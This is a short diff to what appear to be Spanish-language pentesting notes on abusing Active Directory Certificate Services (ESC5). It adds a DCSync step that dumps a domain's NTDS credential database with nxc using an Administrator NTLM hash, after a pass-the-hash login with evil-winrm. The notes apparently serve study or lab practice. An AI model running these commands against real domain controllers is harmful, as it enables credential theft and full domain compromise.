@@ -20,7 +20,7 @@ Componentes:
 	- Quien puede usarlo 
 	- Los permisos 
 
-# ESC 5 Overly Permissive ACLs on Certificate Authority
+# ESC 5 - Overly Permissive ACLs on Certificate Authority
 
 Se tiene permisos **GenericAll** sobre todo el objeto de la CA. 
 Pasos:
@@ -82,4 +82,7 @@ Paso 4:
 Paso 5:
 # Conectarse al server como Administrator 
 ❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
+
+# DCSync 
+❯ nxc smb IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff --ntds 
 ```
